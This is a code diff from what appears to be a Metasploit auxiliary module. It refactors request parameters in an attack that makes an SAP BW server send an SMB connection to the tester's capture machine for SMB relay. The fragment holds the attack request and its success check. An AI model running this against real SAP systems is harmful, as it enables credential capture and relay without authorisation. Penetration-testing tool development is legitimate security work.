@@ -96,12 +96,16 @@ class Metasploit4 < Msf::Auxiliary
     begin
       print_status("#{rhost}:#{rport} - Sending request for #{smb_uri}")
       res = send_request_raw({
-        'uri' => '/sap/bw/xml/soap/xmla?sap-client=' + datastore['CLIENT'] + '&sap-language=EN',
-        'method' => 'POST',
+        'uri'           => "/sap/bw/xml/soap/xmla",
+        'method'        => 'POST',
         'authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD']),
-        'data' => data,
-        'ctype' => 'text/xml; charset=UTF-8',
-        'cookie' => 'sap-usercontext=sap-language=EN&sap-client=' + datastore['CLIENT']
+        'data'          => data,
+        'ctype'         => 'text/xml; charset=UTF-8',
+        'cookie'        => "sap-usercontext=sap-language=EN&sap-client=#{datastore['CLIENT']}",
+        'vars_get'      => {
+          'sap-client'    => datastore['CLIENT'],
+          'sap-language'  => 'EN'
+        }
       })
       if res and res.code == 200 and res.body =~ /XML for Analysis Provider/ and res.body =~ /Request transfered is not a valid XML/
         print_good("#{rhost}:#{rport} - SMB Relay looks successful, check your SMB capture machine")
